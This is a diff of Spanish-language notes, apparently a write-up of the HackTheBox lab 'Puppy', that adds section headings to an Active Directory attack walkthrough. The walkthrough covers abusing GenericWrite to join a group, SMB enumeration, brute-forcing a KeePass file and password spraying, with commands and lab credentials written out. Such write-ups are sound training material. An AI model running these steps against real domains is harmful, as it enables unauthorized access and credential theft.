@@ -118,12 +118,14 @@ Una vez dentro de la web importaremos el `.zip`
 Para buscar a que grupo pertenecemos, en el buscador de **bloodHound** el usuario que nos facilitaron al principio `levis.james` le haremos clic derecho y `add to owned`
 Y en *Outbound Object Control* vemos que el usuario es miembro de `HR@PUPPY.HTB` que tiene capacidad de modificar atributos en otro grupo del que es miembro en este caso del grupo `DEVELOPERS@PUPPY.HTB`, permitiéndonos asignar al usuario dado dentro de otro grupo.
 
+#### Explotación GenericWrite
 Para ver la explotación de `GenericWrite` le hacemos clic y en Linux Abuse, nos indica como abusar de este privilegio añadiéndolo a **DEVELOPERS**:
 `net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htp"/"levi.james"%'KingofAkron2025!' -S $IP`
 
 También podemos añadir el usuario al grupo **DEVELOPERS** con la herramioenta [[BLOODYAD]]
 `bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`
 
+#### Enumeración SMB
 Como nos hemos añadido al grupo **DEVELOPERS** volvemos a enumerar el **SMB** 
 `netexec smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `
 
@@ -143,10 +145,13 @@ KeePass es un **gestor de contraseñas de código abierto y gratuito** que te ay
 
 El archivo descargado lo subimos **Keepassxc** para poder ver su contenido nos pide una password como no tenemos esta contraseña haremos fuerza bruta hacia el archivo
 
+#### Fuerza bruta KeePass
 Usaremos `./keepas4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt`
 La contraseña que nos devuelve es `liverpool`
 
-Una vez conseguimos ver los datos de usuarios y passwords guardaremos las contraseñas en un archivo, y junto con los usuarios que encontramos al principio y haremos fuerza bruta para ver si alguna contraseña le pertenece a algún usuario. 
+Una vez conseguimos ver los datos de usuarios y passwords guardaremos las contraseñas en un archivo, y junto con los usuarios que encontramos al principio haremos fuerza bruta para ver si alguna contraseña le pertenece a algún usuario. 
+
+#### Verificación de USER::PASS
 Usaremos [[CRACKMAPEXEC-NETEXEC]]
 `netexec ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`
 
